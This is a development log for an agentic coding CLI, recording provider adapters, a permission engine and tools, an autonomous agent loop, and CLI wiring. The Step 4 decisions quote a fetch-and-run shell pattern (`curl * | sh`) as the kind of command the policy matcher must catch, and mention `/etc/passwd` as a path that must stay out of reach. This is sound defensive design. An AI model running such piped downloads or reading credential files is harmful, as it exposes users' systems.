- **Env scrub by name pattern** rather than allowlist. Allowlist breaks every script that needs its specific env vars; deny-by-name catches the leak shape without breaking common tooling.
- **Renderer sinks are functions, not streams.** `(s: string) => void` is trivial to test; passing a `WritableStream` would require Bun's stream API in tests. The function shape also lets us collect strings into arrays for assertions.
- **`StorageJsonError` is a typed class** rather than a string match in messages. Lets future code differentiate corruption from logic errors.
- **`bash` env scrub list intentionally over-broad.** Catches false positives (a legit `BUILD_TOKEN` in CI) but the failure mode is "subprocess can't see the var" which is debuggable; the alternative (under-scrub) is silent credential leakage.

**Out of scope (still M2+):**
- Sandbox proper (bwrap / sandbox-exec)
- Trust prompt for new directories
- Hierarchy enterprise→user→project→session permission merging
- Cost tracking via provider token usage
- Hooks (PreToolUse, PostToolUse)
- Resume / replay / session picker
- Real network integration tests for retry (requires evals harness)
- Concurrent SQLite access stress tests (M2 with subagents)
- DB file mode 0600 (cosmetic; doc gap)

**Pending:** none.

**Next:** M2 plan. Top candidates from the spec, ranked by likely pain when actually using the CLI: cost tracking + telemetry, compaction, resume from session id, plan mode, sandbox, doctor command.

---

## [2026-04-27] M1 / Step 6 — One-shot CLI + harness lifecycle events (closes M1)

**Done:**
- `src/harness/types.ts` — `HarnessEvent` union (`session_start`, `step_start`, `provider_event`, `tool_invoking`, `tool_decided`, `tool_finished`, `session_finished`) + `onEvent` callback on `HarnessConfig`.
- `src/harness/collect.ts` — `collectStep` now accepts an `onEvent` forwarder so each provider stream event surfaces in real time. Renderer throws are swallowed.
- `src/harness/loop.ts` — emits the lifecycle events around each step, around each tool invocation, and around the session itself. `safeEmit` helper makes the integration crash-proof.
- `src/harness/invoke-tool.ts` — `InvokeToolResult` now carries the `Decision | null` so the loop can fire `tool_decided` events for renderers (null when the tool wasn't found, since no decision happened).
- `src/cli/args.ts` — hand-rolled parser. Flags: `--version`/`-v`, `--help`/`-h`, `--json`, `--model <id>`, `--max-steps <n>`. Unknown flag → reject with diagnostic. Anything not a flag is collected as the prompt (joined by spaces).
- `src/cli/bootstrap.ts` — `bootstrap(input)` builds a `HarnessConfig` from cwd + env. Default model is `anthropic/claude-sonnet-4-6`. Loads `./.agent/permissions.yaml` if present (returns `policySource: 'project'`), otherwise falls back to `defaultPolicy()` (strict + empty rules — refuses everything until explicitly configured). Migrates the DB. Registers the 6 builtin tools. Exposes `providerOverride` and `dbPath` test seams.
- `src/cli/output/{types,plain,json}.ts` — `OutputRenderer` interface, plus two implementations:
  - `plain.ts` for TTY/pipe output: assistant text streams to stdout, tool indicators and lifecycle markers go to stderr (so a piped stdout stays a clean transcript). ANSI colors only when stderr is a TTY and `NO_COLOR` is unset.
  - `json.ts` for `--json`: NDJSON lines to stdout, one per `HarnessEvent`. Spec §2.2: in `--json`, stdout is NDJSON only.
- `src/cli/signal.ts` — `installSignalHandler` wires SIGINT to an `AbortController`. First Ctrl+C requests graceful abort; second forces `process.exit(130)`.
- `src/cli/run.ts` — orchestrator. Picks renderer, builds bootstrap input from args, installs signal handler, calls `runAgent`, maps the `HarnessResult` to a process exit code per spec §2.2 (0 done · 1 error · 2 exhausted · 130 interrupted).
- `src/cli/index.ts` — full rewrite. Was a stub that exited 1; now dispatches to `run` after parsing args, with `--version`/`--help` short-circuits and a `missing prompt` error path.
- `tests/cli/args.test.ts` — **15 cases** covering each flag, value parsing, rejection of unknown flags / non-numeric `--max-steps` / missing `--model` value, mixed-flag prompts, empty argv.
- `tests/cli/bootstrap.test.ts` — **7 cases** with isolated tmpdirs and a mock provider: default model, model override, unknown-model rejection, project policy loading, default-policy fallback, budget forwarding, DB migration.
- `tests/harness/events.test.ts` — **6 cases** for the `onEvent` contract: bracketing events, `step_start` per iteration, `provider_event` forwarding, full `tool_invoking → tool_decided → tool_finished` sequence, `tool_decided` skipped for unknown tools (no decision was made), throwing renderer doesn't derail the loop.
- `tests/cli.test.ts` updated for the new entry: `--help` exit 0 with usage, missing prompt exits 1 with usage, unknown flag rejected, unknown model from bootstrap surfaces in stderr.
- Total suite: **289 pass / 6 skip / 617 expect() calls** in ~1.6s.

**Code-review fixes folded in before commit:**
- **`bootstrap` no longer leaks the DB on throw.** Reordered to load policy and resolve the provider *before* opening SQLite, since those steps can throw on malformed YAML or unknown model. `migrate` (the only remaining throw-source after the DB opens) is wrapped in try/catch that closes the DB on throw. Two regression tests assert the DB file isn't even created when bootstrap aborts.
- **`src/cli/index.ts` now catches stray throws from `main()`.** Top-level `await main()` was unwrapped — any sync throw from `parseArgs` or stdout/stderr writes would surface as Bun's default unhandled-rejection trace instead of a "forja: ..." diagnostic.
- **`--max-steps` rejects decimals, hex, scientific notation, and leading zeros.** Was: `Number.parseInt('3.5', 10)` returned `3` and silently passed validation. Now: regex `^[1-9][0-9]*$` validates the literal before parsing. Three regression tests pin the behavior.
- **Dead code removed from `args.ts`.** `FLAGS_REQUIRING_VALUE` was declared and consulted in the default branch, but the flags it listed were already intercepted by their explicit `case`s — the check could never fire. Default branch simplified to rejecting any `--`-prefixed token outright.

**Decisions:**
- **No Ink in M1.** The roadmap mentioned "Ink mínimo" but plain text + ANSI delivers a working one-shot CLI today. Ink belongs with the *interactive* TUI (input editor, slash commands, ongoing conversation) which is M2 territory. Adding React + Ink for one-shot streaming would be ~300 lines of components for output that ANSI does in 80 lines. Documented as deliberate deferral.
- **Hand-rolled arg parser.** The flag set is small (5 flags) and stable. Adding `commander` or `yargs` would be more surface area than the parser itself. ~80 lines.
- **`OutputRenderer` interface** sits between the harness and the actual renderer. Plain + JSON ship now; an `InkRenderer` can drop in next without touching the harness or the CLI dispatch.
- **Stdout vs stderr split:** assistant text → stdout (clean transcript when piped); everything else (tool indicators, lifecycle markers, summary) → stderr. Aligns with spec §2.2 ("stdout puro, stderr pra log") and lets `agent "summarize X" > out.md` work intuitively.
- **Color detection looks at `stderr.isTTY`**, not stdout. Tool indicators live on stderr; if it's piped, ANSI would corrupt the log. `NO_COLOR` env var disables colors regardless.
- **Default policy is strict + empty.** First-time users hit a deny on every tool, which forces them to opt in via `.agent/permissions.yaml`. Surprising at first but the right default for a tool that runs `bash`. Documented in usage.
- **`onEvent` is synchronous.** Async would let renderers do work before the loop continues but adds complexity (await per event) and doesn't help the current renderers. Sync + crash-proof (try/catch around each call) is the right trade for M1.
- **`tool_decided` is skipped for unknown tools.** No decision happened; emitting an event would imply one. Renderers can rely on the invariant: if `tool_decided` fires, there's a real `Decision`.
- **DB closes on every CLI exit path** — `try/finally` in `run.ts`. SQLite WAL leaves dangling files if not closed cleanly.
- **Exit 130 for both abort and SIGINT.** Unix convention for "terminated by signal 2 (INT)". Even though the wall-clock cap also returns `interrupted`, that's fine — exit 130 means "didn't run to completion", not specifically "user pressed C".

**Out of scope:**
- Ink components and interactive TUI — M2
- Slash commands (`/help`, `/cost`, `/model`, `/clear`) — M3
- Resume / `--resume <id>` — M2
- Plan mode (`--plan`) — M2
- Replay (`--replay <id>`) — M2
- Cost display (no token extraction yet) — M2
- `--list-tools`, `--list-sessions`, `agent doctor` — M2
- Capability detection beyond TTY/NO_COLOR (truecolor, locale, image protocol) — M2
- `agent` with no prompt as REPL — M2
- Hierarchy resolution for permissions (enterprise → user → project) — M2

**Pending:** none for this step. **M1 closes here.**

**Next:** M2. Plenty of options (compaction, telemetry/cost, plan mode, resume, sandbox, doctor, more eval coverage). Decide priority once we run the CLI against real models for a while and see what hurts.

---

## [2026-04-27] M1 / Step 5 — Agent Harness (autonomous loop)

**Done:**
- `src/harness/types.ts` — `RunBudget` (`maxSteps`, `maxWallClockMs`, `maxToolErrors`, `maxRepeatedToolHash`, `maxOutputTokensPerCall`), `DEFAULT_BUDGET`, `ExitReason` enum (`done`/`maxSteps`/`maxWallClockMs`/`maxToolErrors`/`degenerateLoop`/`aborted`/`providerError`/`scriptExhausted`), `HarnessConfig`, `HarnessResult`.
- `src/harness/collect.ts` — `collectStep(events)` drains a provider stream into `{message_id, text, tool_uses, thinking, stop_reason, errors}`. Tool names from `tool_use_start` are tracked by id and reattached on `_stop` (canonical event has only the id at stop time). Orphan stops become `harness.orphan_tool_use_stop` errors instead of crashes.
- `src/harness/invoke-tool.ts` — single-tool pipeline. Lookup → persist `tool_calls` row → engine.check → record approval → start/finish with the right status. `confirm` decisions become `confirm_no` denials in M1 (no UI yet); the original prompt is surfaced to the model in the tool_result. Tool exceptions never propagate; they're wrapped as `tool.exception` errors.
- `src/harness/loop.ts` — `runAgent(config)` autonomous loop. Builds the running message list, calls provider, builds assistant content blocks (text first, then tool_uses) for both DB persistence and the next request, drives every tool through `invokeTool`, accumulates tool_results into the next user message. Snapshots `messages` on each request so post-call mutations don't retroactively change what the provider observed. Sliding-window degenerate-loop detector (sha256 of `name:stableJson(args)`, window 5, threshold from `budget.maxRepeatedToolHash`).
- `src/harness/index.ts` — public surface.
- `tests/harness/collect.test.ts` — **8 tests**: text-only, single tool_use lifecycle, parallel tool_uses tracked by id, text+tool_use coexistence, thinking_delta, error events captured, orphan-stop defensive path, default stop_reason.
- `tests/harness/invoke-tool.test.ts` — **6 tests**: happy path with approval row + tool_call lifecycle, unknown tool (no DB rows), policy deny, M1 confirm-becomes-denied with prompt surfaced, tool returning ToolError, tool throwing → `tool.exception`.
- `tests/harness/loop.test.ts` — **10 tests** with a scripted mock provider: text-only one-step done, tool→result→done two-step (with assertion that the second request observes the tool_result message), maxSteps cap, pre-aborted signal, unknown tool (loop continues), policy deny (loop continues), maxToolErrors cap, degenerateLoop detection (identical args), session/messages persisted to SQLite, provider crash → providerError with detail.
- Total suite: **254 pass / 6 skip / 529 expect() calls** in ~670ms.

**Code-review fixes folded in before commit:**
- **Gemini integration unblocked.** The harness emits user messages with `tool_result` blocks; the Gemini adapter rejected them because Gemini correlates by function name, not id. Now `ProviderToolResultBlock` carries an optional `name`, the harness populates it from `input.toolName` on every result (success and error paths), and the Gemini adapter converts to `functionResponse` instead of throwing. Anthropic and OpenAI ignore the field. Two new tests pin the contract: Gemini conversion with `name` works; the missing-`name` case still throws (for catching harness bugs).
- **Empty error messages no longer get lost.** `(e as Error).message ?? String(e)` returned `""` when an `Error` had an empty message (nullish coalescing only catches null/undefined). Replaced with `e.message || e.name || String(e)` — falls through to the constructor name and finally `toString` so we never report `tool crashed: ` with no body. Same fix in the harness `providerError` path.

**Decisions:**
- **`maxCostUsd` deferred to M2.** Stream events don't expose token usage in M1 (the normalizer drops `message_delta.usage`); cost tracking lives with telemetry.
- **`confirm` → `confirm_no` in M1**, with the prompt text mirrored into the tool_result so the model sees *why* it was denied. Step 6 (TUI) replaces this branch with a real prompt and decides `confirm_yes`/`confirm_no` based on user input.
- **No checkpoint creation in this step.** The plan listed "checkpoints básicos" but the table doesn't exist yet; adding a stub now would be dead code. Migration 003 + git-stash integration land in M3 with the rest of the rollback subsystem.
- **`messages` array is cloned per request** (`{...messages}`). The previous version passed a shared reference; mutations during the next iteration would have changed what the provider observed (caught by a test asserting the second request sees the tool_result message as the last entry).
- **Hash window is in-memory.** Spec §13 has `tool_calls.input_hash` for SQL-side analysis; the harness's degenerate-loop detection uses an in-process sliding window keyed on `sha256(name + stableJson(args))`. SQL-side detection is M2.
- **All registered tools are sent to the provider.** No filtering by playbook/role yet — the harness exposes the full registry. Filtering is a Step 6 / playbooks (M3) concern.
- **Aborted signal is checked before each step AND between tool invocations within a step.** A multi-tool step honors abort mid-execution rather than waiting for the next iteration.
- **`scriptExhausted` exit reason** is reserved for the mock provider draining (test-only path); production providers never hit it.

**Out of scope:**
- Streaming UI — the harness collects whole steps before persisting (Step 6 will tee events to UI)
- Compaction — full message history sent every turn (M2)
- Checkpoints — `tool.metadata.writes` flag is read but no snapshot is taken (M3)
- Hooks (PreToolUse, PostToolUse, Stop, etc.) — M4
- Subagents (`task_*`) — M3
- Resume from DB — current loop only runs forward from a fresh user prompt (M2)
- Cost tracking — needs token usage extraction in stream normalizer (M2)
- Provider retry/backoff on 5xx — would wrap provider.generate; harness in M2

**Pending:** none for this step.

**Next:** Step 6 — Ink TUI mínimo + one-shot mode wiring. Connect the CLI entry (`src/cli/index.ts` is still a stub) to `runAgent` with a real Anthropic provider, render streaming output and tool calls in the terminal, wire `Ctrl+C` to the AbortSignal. Closes M1.

---

## [2026-04-27] M1 / Step 4 — Permission Engine + Tool System + 6 builtin tools

**Done:**
- `src/storage/migrations/002-approvals.ts` — adds the `approvals` table per AGENTIC_CLI §13 (FK cascades from `tool_calls`, CHECK constraints on `decision` and `decided_by`, index on `tool_call_id`).
- `src/storage/repos/approvals.ts` — `recordApproval`, `listApprovalsByToolCall`. Exported through `src/storage/index.ts`.
- `src/permissions/types.ts` — `Policy`, `PolicyMode` (`strict` | `acceptEdits` | `bypass`), `PolicyCategory` (`fs.read` | `fs.write` | `bash` | `web.fetch` | `misc`), `Decision` (allow / deny / confirm), per-tool rule shapes (`BashPolicy`, `PathPolicy`, `FetchPolicy`), `PermissionsView`.
- `src/permissions/matcher.ts` — `matchPath` (Bun.Glob, cwd-anchored so `**/foo` can't reach `/etc/passwd`), `matchCommand` and `matchHost` (custom glob→regex compiler so `*` matches across `/` and spaces), plus `firstMatching*` helpers for diagnostics.
- `src/permissions/engine.ts` — `createPermissionEngine(policy, opts)` returns `check(toolName, category, args) → Decision`. Order: deny rules first (always win), then allow, then confirm; default = deny. `bypass` short-circuits to allow. `acceptEdits` upgrades unmatched writes from deny to confirm (not auto-allow — see Decisions).
- `src/permissions/config.ts` — `parsePolicy`, `loadPolicyFromString`, `loadPolicyFromFile`, `defaultPolicy`. Strict validator: rejects mistyped keys (`allow_path` instead of `allow_paths` is the bug class), rejects malformed mode values, rejects non-mapping top-level.
- `src/permissions/index.ts` — public surface.
- `src/tools/types.ts` — `Tool<I, O>`, `ToolContext` (signal + cwd + sessionId + stepId + permissions per CONTRACTS §2), `ToolResult<O> = O | ToolError`, `isToolError` discriminator, `toolError` constructor, `ERROR_CODES` enum.
- `src/tools/registry.ts` — `createToolRegistry`.
- `src/tools/builtin/{read-file,write-file,edit-file,glob,grep,bash}.ts` — six tools, all returning `ToolResult` (no thrown errors).
- `src/tools/builtin/index.ts` — `BUILTIN_TOOLS` array + `registerBuiltinTools(reg)` helper.
- `src/tools/index.ts` — public surface.
- `.github/workflows/ci.yml` — adds `apt install ripgrep` step so the grep tool's tests run instead of skipping.
- New dep: `yaml@latest` (parser).
- New tests:
  - `tests/storage/approvals.test.ts` — 6 cases: roundtrip, ordering, FK cascade, CHECK rejections, FK rejection on unknown tool_call_id.
  - `tests/permissions/matcher.test.ts` — 18 cases covering path resolution (relative, absolute, outside-cwd), command matching (exact, prefix, wildcard with spaces and slashes), host matching (case, glob), `firstMatching*` helpers.
  - `tests/permissions/engine.test.ts` — 17 cases: bash allow/deny/confirm, path allow/deny/confirm, mode behaviors (strict/acceptEdits/bypass), web.fetch hosts, misc category, missing-arg rejections.
  - `tests/permissions/config.test.ts` — 10 cases: full policy parse, mode default, malformed-key rejection, YAML syntax errors, default policy.
  - `tests/tools/registry.test.ts` — 4 cases.
  - `tests/tools/_helpers.ts` — shared `makeCtx()` for tool tests.
  - `tests/tools/{read-file,write-file,edit-file,glob,bash}.test.ts` — 5 happy-path + error-path + abort-signal coverage per tool.
  - `tests/tools/grep.test.ts` — 6 cases gated on `rg` availability via `describe.if(RG_AVAILABLE)` (skips locally if ripgrep missing; CI installs it).
- Existing `tests/storage/migrate.test.ts` updated to assert ≥ 2 migrations (was hardcoded to 1).
- Total suite: **228 pass / 6 skip / 446 expect() calls** in ~600ms.

**Code-review fixes folded in before commit:**
- **`acceptEdits` mode now matches spec §8 semantics.** Was: `confirm_paths` still required confirmation AND unmatched writes escalated to confirm. Now: `confirm_paths` for writes auto-allows (skip confirmation step — the actual convenience the mode promises); unmatched writes default-deny (mode is convenience, not bypass); reads keep the same confirm behavior. Deny still wins over confirm in all modes.
- **`PermissionsView.hasPathRule` removed.** It was hardcoded to look up `write_file`/`read_file` rules, ignoring per-tool overrides on `edit_file`/`glob`/etc. — wrong by construction, with no caller. The harness in Step 5 will call `engine.check(toolName, ...)` directly with the right tool name. The view now exposes only `mode`.
- **`parsePolicy` rejects top-level arrays.** Previously slipped through the `typeof === 'object'` check.
- **`bash` wraps `SIGTERM` in try/catch** (was already wrapped on the SIGKILL escalation). The proc can exit on its own between the timer firing and `proc.kill()` running — kill on a dead pid throws ESRCH; we swallow it now.
- **`edit_file` rejects empty `old_string` explicitly** (`edit.old_string_empty`) with a hint pointing to `write_file`. Previously fell through to `old_string_not_found`, which was less diagnostic.

**Decisions:**
- **`Tool.execute` returns `O | ToolError` instead of throwing** (CONTRACTS §2, cláusula 7). Errors are *data*. Tests use `isToolError(out)` discriminator instead of try/catch. The harness in Step 5 catches stray throws and converts them, but builtins don't throw.
- **Custom glob→regex compiler for commands and hosts** instead of `Bun.Glob`. Bun's `*` doesn't cross `/` (correct for paths, wrong for `curl * | sh` where the URL contains `/`). The compiler escapes regex metachars and translates `*`→`.*`, `?`→`.`. The "no regex in policy" rule (CLAUDE.md) is preserved — the user still authors with glob syntax; regex is an internal implementation detail.
- **`acceptEdits` mode upgrades unmatched writes from deny to confirm**, not to auto-allow. The mode is opt-in convenience for refactor sessions, not a free-for-all. Auto-allow lives in `bypass` (which requires an explicit dangerous flag, deferred).
- **Permission categories instead of per-tool rules everywhere.** New tools join an existing category instead of needing a new policy section. The YAML still supports per-tool overrides (`tools.bash`, `tools.write_file`).
- **Path matcher is cwd-anchored.** A pattern like `src/**` resolves against cwd before matching, and an absolute target outside the cwd subtree falls back to direct absolute match. Result: bare `**/foo` can't reach `/etc/passwd` — security property by construction.
- **Strict validator rejects unknown shapes** (e.g., `allow_path` typo'd as singular). Silently ignoring unrecognized keys is how YAML-driven policies turn into "allow-everything" in production.
- **`bash` is `writes: true` pessimistically** (per CONTRACTS §2.6.3). The `read_only` flag in the input schema is a hint *from the caller*, not the tool — Step 5 harness can use it to route through a different policy path.
- **`grep` shells out to `rg`** instead of pure-TS implementation. Performance + battle-tested feature set. Tests skip cleanly if `rg` is missing; CI installs it.
- **Hierarchy resolution is project-only in M1** — no enterprise/user/project/session merging yet. Spec §8 requires it; landing in M2 with the trust subsystem.
- **`yaml` over `js-yaml`** — newer API surface, comparable battle-testing, smaller install footprint.

**Out of scope:**
- Sandbox (`bwrap` / `sandbox-exec`) — M2
- Checkpoint creation before writes — Step 5 / M3
- Hook integration (PreToolUse / PostToolUse) — M4
- Hierarchy enterprise → user → project → session — M2
- Output sanitization (CSI escape stripping) — M2
- The other 15 tools in CONTRACTS §2.6 (background, task_*, memory_*, fetch_url, code retrieval) — later steps/milestones
- Confirmation UI — Step 6 (Ink); engine returns `Decision` shape ready for the UI to consume
- Real-API/network tests for grep — would need fixtures; current coverage is enough for the wrapper

**Pending:** none for this step.

**Next:** Step 5 — Agent Harness loop (autonomous profile) per AGENTIC_CLI §5. Ties storage + provider + permissions + tools together: session lifecycle, message loop with budget, tool invocation pipeline (engine.check → record approval → execute → persist), abort/cancel, basic checkpoint stub.

---

## [2026-04-27] M1 / Step 3.6 — OpenAI (GPT) adapter

**Done:**
- Added `openai@6.34.0` dependency.
- `src/providers/openai/capabilities.ts` — capabilities for `gpt-4o` and `gpt-4o-mini`. Cache mode declared as `client_only` (OpenAI's prefix-cache is automatic and probabilistic — there is no server-side cache the adapter can target the way Anthropic does).
- `src/providers/openai/stream.ts` — `normalizeOpenAIStream` converts Chat Completions chunks into the canonical `StreamEvent` taxonomy. Handles: id from first chunk (synth fallback), text deltas, refusal field (emitted as text_delta), tool_call accumulation per `index` (id and name may straggle, args streamed across deltas), per-tool finalization at end-of-stream (OpenAI has no per-tool stop event), finish_reason mapping, malformed JSON args drop with error event.
- `src/providers/openai/index.ts` — `createOpenAIProvider(modelName, opts)`. Reads API key from `opts.apiKey` or `OPENAI_API_KEY`; supports `baseURL` for OpenAI-compatible endpoints (Azure OpenAI, OpenRouter). Test seam via `opts.client`. Message conversion is the most complex of the three adapters: a single `ProviderMessage` may produce multiple OpenAI messages (assistant text + tool_calls coalesce; tool_result blocks split into separate `role: 'tool'` messages). System prompt prepended as the first message.
- `src/providers/openai/register.ts` — `registerOpenAIModels(reg)`.
- `createDefaultRegistry` got a one-line addition: `registerOpenAIModels(reg)`. No other registry-side changes — the extensibility refactor from Step 3.5 paid off as designed.
- `tests/providers/openai-stream.test.ts` — **13 tests** covering text-only, tool_call lifecycle (incl. straggling id/name), parallel tool_calls finalized in index order, synthesized id, id-overrides-synth, real-id-not-overwritten regression, refusal as text_delta, content+refusal in the same chunk, finish_reason mapping (6 cases), null doesn't clobber, malformed args, empty stream.
- `tests/providers/openai.test.ts` — **17 tests** covering model rejection, env key, capabilities, generateConstrained stub, generate end-to-end, system prepending, config forwarding (`stream: true` enforced), assistant tool_use coalescing, user tool_result splitting into tool-role messages, mixed tool_results+text ordering regression, tool_result-on-assistant throw, tool_use-on-non-assistant throw, countTokens heuristic (chars/4) on text and on tool blocks.
- `tests/providers/registry.test.ts` updated — asserts OpenAI lineup, total count = sum of all three families, OpenAI factory parity test.
- Total suite now **140 tests / 289 expect() calls** in ~285ms.

**Code-review fixes folded in before commit:**
- `ToolCallInProgress` carries an explicit `idIsSynthesized: boolean` flag instead of relying on the `startsWith('call_')` heuristic. Real OpenAI ids start with `call_` too, so the prefix couldn't tell synth from real — a real id arriving in chunk 1 could (in theory) be silently overwritten by a later chunk. The flag flips false the first time a real id is set and stays there.
- `toOpenAIMessages` now emits `tool_result` messages **before** the user text message when both are present in the same `ProviderMessage`. Reversing the order would make the model see a new user prompt before the tool results it requested in the prior assistant turn.
- Throws on `tool_result` blocks in non-user messages, symmetric to the existing throw for `tool_use` blocks in non-assistant messages. Catches malformed callers at the boundary instead of forwarding nonsense to the API.

**Decisions:**
- **`countTokens` is a chars/4 heuristic**, not a real tokenizer call. OpenAI exposes no server-side `countTokens` endpoint (unlike Anthropic and Google) — proper local impl needs `tiktoken`. The heuristic is within ~10% for English, good enough for budget early-warnings. Replaced with tiktoken when M5 wires the local tokenizer. Documented in code.
- **`delta.refusal` becomes `text_delta`**, not a dedicated event kind. OpenAI's safety refusals are user-visible prose; treating them as text matches what reaches the UI. The accompanying `finish_reason` is `'stop'`, not `'content_filter'`, so no special stop reason needed.
- **`baseURL` is exposed in options** to support Azure OpenAI / OpenRouter / Together / Groq / etc. Same SDK shape; just a different host.
- **Tool args stream across chunks** like Anthropic (unlike Gemini). Tracking is keyed by `tool_calls[].index` (stable across chunks, unlike `id` which arrives only once). Edge cases covered: id arriving in a later chunk, name in a different chunk than the index registration, multiple parallel tool_calls finalized in index order at end-of-stream.
- **`ProviderMessage` → multiple `OpenAIMessage`**: a `user` message containing tool_result blocks can't fit OpenAI's schema (which requires `role: 'tool'` for results), so we split. Documented inline; tests pin the contract.
- **Step 3.5's extensibility refactor paid off**: adding GPT was 4 new files in `src/providers/openai/` + 1 line in `createDefaultRegistry`. No edits to shared types, no edits to `registry.ts`'s `ModelEntry`, no changes to other adapters. This is the regression-bar for "easy to add new providers".
- **Model lineup intentionally narrow** (`gpt-4o` + `gpt-4o-mini`) — matches PROVIDERS.md §2's table. Newer models (gpt-5, o-series reasoning) added when their quirks (no system prompt, hidden reasoning tokens) are characterized — that's its own design exercise.

**Out of scope:**
- Real network coverage (deferred to evals)
- `tiktoken`-based token counting (M5)
- Reasoning models (o1/o3/etc) — different shape, deferred
- Structured outputs via `response_format: json_schema` (deferred until `generateConstrained` ships)
- Azure-specific auth (uses `apiKey` + `baseURL` pattern; full Azure AD OAuth deferred)

**Pending:** none for this step.

**Next:** Step 4 — Permission Engine + first 6 tools (`AGENTIC_CLI §7.1, §8`). Now with three providers behind the same `Provider` interface, the harness in Step 5 has real choice.

---

## [2026-04-27] M1 / Step 3.5 — Gemini adapter + extensibility refactor of the registry

**Done:**
- Added `@google/genai@1.50.1` dependency.
- `src/providers/google/capabilities.ts` — capabilities for `gemini-2.5-pro`, `gemini-2.5-flash`, `gemini-2.5-flash-lite`. Cache mode is `server_persistent` (Gemini context caching is durable, not 5min like Anthropic). Cost numbers are illustrative (PROVIDERS.md §5 said "to document when adapter is implemented" — covered with placeholder values consistent with the rest of the registry).
- `src/providers/google/stream.ts` — `normalizeGoogleStream` converts Gemini chunks into the canonical `StreamEvent` taxonomy. Handles: synth `start` on first chunk (Gemini has no `message_start` frame), text deltas, function calls (single complete part per chunk → emit start+delta+stop back-to-back), `thought`/`thinkingText` parts, finishReason mapping (STOP/MAX_TOKENS/TOOL_CALLS/FUNCTION_CALL/SAFETY/RECITATION/BLOCKLIST/PROHIBITED_CONTENT/SPII), null finishReason guard, empty stream fallback.
- `src/providers/google/index.ts` — `createGoogleProvider(modelName, opts)` factory. Reads API key from `opts.apiKey`, `GOOGLE_API_KEY`, or `GEMINI_API_KEY`. Test seam via `opts.client`. Message conversion: `'assistant'`→`'model'`, content string→`parts:[{text}]`, content blocks→parts, `tool_use`→`functionCall`. `tool_result` blocks **throw** with a clear message (Gemini correlates by name not id; the harness will own id↔name resolution in Step 5+). Tool defs convert to Gemini's `functionDeclarations` shape.
- `src/providers/google/register.ts` — `registerGoogleModels(reg)`.
- `src/providers/anthropic/register.ts` — same pattern, extracted from registry.ts.

**Registry refactor (extensibility):**
- `ModelEntry.factory` is now `(opts?: unknown) => Provider` at the registry boundary. The previous `CreateProviderOptions = CreateAnthropicProviderOptions` alias is gone — registry no longer needs to know every family's option shape. Each adapter narrows internally with a structural cast.
- `createDefaultRegistry()` is now a 3-line orchestrator: `createRegistry()`, `registerAnthropicModels(reg)`, `registerGoogleModels(reg)`. Adding GPT later is one new `registerOpenAIModels` import + one call.
- The trade-off: callers wanting compile-time typed options should import the adapter's `create<X>Provider` directly. Going through `entry.factory` is type-erased on options. Documented in the `ModelEntry.factory` comment.

**Tests added:**
- `tests/providers/google-stream.test.ts` — **12 tests** covering text-only, functionCall lifecycle, synthesized vs SDK-provided ids, thought parts, finishReason mapping (8 cases incl. unknown), null doesn't clobber, empty stream, mixed-parts.
- `tests/providers/google.test.ts` — **12 tests** covering model rejection, env var lookup (GOOGLE_API_KEY / GEMINI_API_KEY), capabilities, generateConstrained stub, generate end-to-end through mock client, role/content mapping (`assistant`→`model`), config forwarding, `tool_result` block throw, countTokens (with totalTokens fallback to 0).
- `tests/providers/registry.test.ts` updated to assert both Anthropic and Google lineups, parity per family, and "all default entries can be instantiated with just an apiKey" — the regression test for "easy to add new providers".
- Total suite now **110 tests / 224 expect() calls** in ~500ms.

**Decisions:**
- **`(opts?: unknown) => Provider`** at the registry boundary — chosen over a discriminated union or a generic `ModelEntry<TOpts>` because both alternatives forced every consumer of the registry to either narrow on family or carry generics that erase at lookup time. The `unknown`-with-cast pattern keeps adding a family to a 1-line change in `createDefaultRegistry`. Compile-time safety on options is recovered by importing the family's `create<X>Provider` directly.
- **API key precedence for Google**: `opts.apiKey` → `GOOGLE_API_KEY` → `GEMINI_API_KEY`. Both env vars are common in the wild; we accept either to reduce friction.
- **Gemini `tool_result` blocks throw rather than silently corrupt**. Gemini correlates function calls by name, not id; doing the conversion correctly requires the original function name, which only the harness knows. Throwing is honest until Step 5 wires the resolution.
- **Function call ids are synthesized** for Gemini when the SDK doesn't provide one (`call_<n>_<uuid>`). The same id is used across `tool_use_start` / `_delta` / `_stop` (asserted by test).
- **`thought: true` parts → `thinking_delta`** to mirror Anthropic's extended thinking pass-through. Plain text parts (`thought` absent or false) → `text_delta`.
- **Per-family register* helpers** instead of a generic `buildFamilyEntries(family, ...)` — the per-family helper lives in the family's folder, so adding a family doesn't touch shared `registry.ts` code at all (only the orchestration line).

**Out of scope:**
- Real network coverage (deferred to evals)
- `tool_result` round-trip in messages (Step 5 — harness needs id↔name map)
- OpenAI / Ollama / llama.cpp — adapters land in M5 with the same pattern

**Pending:** none for this step.

**Next:** Step 4 — Permission Engine + first 6 tools (`AGENTIC_CLI §7.1, §8`).

---

## [2026-04-27] M1 / Step 3 — Provider Anthropic adapter + Model Registry

**Done:**
- `src/providers/types.ts` — canonical `Provider`, `ProviderCapabilities`, `StreamEvent`, `ProviderMessage`, `GenerateRequest`, `ConstrainedRequest`, `ProviderToolDef`, `StopReason`, family/cache/tools/constrained enums (per `AGENTIC_CLI §14`, `PROVIDERS.md §1`, `CONTRACTS.md §4`).
- `src/providers/anthropic/capabilities.ts` — caps for the three M1 Anthropic models (opus-4-7, sonnet-4-6, haiku-4-5). Costs taken verbatim from `PROVIDERS.md §5`.
- `src/providers/anthropic/stream.ts` — `normalizeAnthropicStream(rawEvents)` converts SDK raw events into the canonical `StreamEvent` taxonomy. Handles parallel tool_use blocks, partial JSON arg accumulation, malformed JSON fallback, thinking deltas, signature-delta drop, unknown stop_reason fallback.
- `src/providers/anthropic/index.ts` — `createAnthropicProvider(modelName, opts)` factory. Reads API key from `opts.apiKey` or `ANTHROPIC_API_KEY`. Exposes a test-seam (`opts.client`) for injecting a pre-built SDK client. `generate()` streams; `countTokens()` calls the SDK; `generateConstrained()` is a deliberate stub that rejects with a clear "not implemented in M1" error.
- `src/providers/registry.ts` — `createRegistry()` factory + `createDefaultRegistry()` pre-populated with the three Anthropic models. Each entry carries id, family, modelName, capabilities, and a `factory(opts)` to instantiate a live `Provider`.
- `src/providers/index.ts` — public surface; re-exports types and constructors.
- `tests/providers/*.test.ts` — 3 files, **31 tests** covering: stream normalization (12 cases incl. text-only, tool_use lifecycle, malformed JSON, non-object args, parallel tool_use, signature_delta drop, default-when-no-stop, null doesn't clobber a prior valid stop_reason, omitted-stop-reason ignored), adapter shape + wiring (model rejection, env vs option key, id/family/capabilities, generateConstrained stub, generate end-to-end through mock client, optional-field omission, countTokens), registry (insert/get/has/list, duplicate refusal, default lineup, factory↔entry capability parity).
